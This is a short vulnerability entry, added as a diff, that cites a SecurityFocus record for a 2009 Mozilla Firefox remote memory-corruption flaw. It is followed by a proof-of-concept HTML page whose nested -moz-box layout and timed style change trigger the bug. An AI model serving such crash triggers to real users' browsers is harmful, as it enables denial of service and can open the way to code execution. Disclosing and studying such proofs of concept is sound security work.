@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/36866/info
+
+Mozilla Firefox is prone to a remote memory-corruption vulnerability.
+
+Successful exploits may allow an attacker to execute arbitrary code in the context of the user running the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+NOTE: This issue was previously covered in BID 36843 (Mozilla Firefox and SeaMonkey MFSA 2009-52 through -64 Multiple Vulnerabilities), but has been assigned its own record to better document it. 
+
+<html><head><script> function doe2(i) { document.getElementById('a').setAttribute('style', 'display: -moz-box; '); document.getElementById('c').style.display= 'none'; } setTimeout(doe2,500,0); </script> <style> div::first-letter {float: right; } </style> </head> <body> <div style="width: 50px; -moz-column-count: 2;"> a <span style="display: table-cell;"></span><div style="display: -moz-box; font-size: 43px;"> <span id="a"> <span style="display: -moz-box;"> <span id="c">m</span> </span> </span> </div> </div> </body> </html>
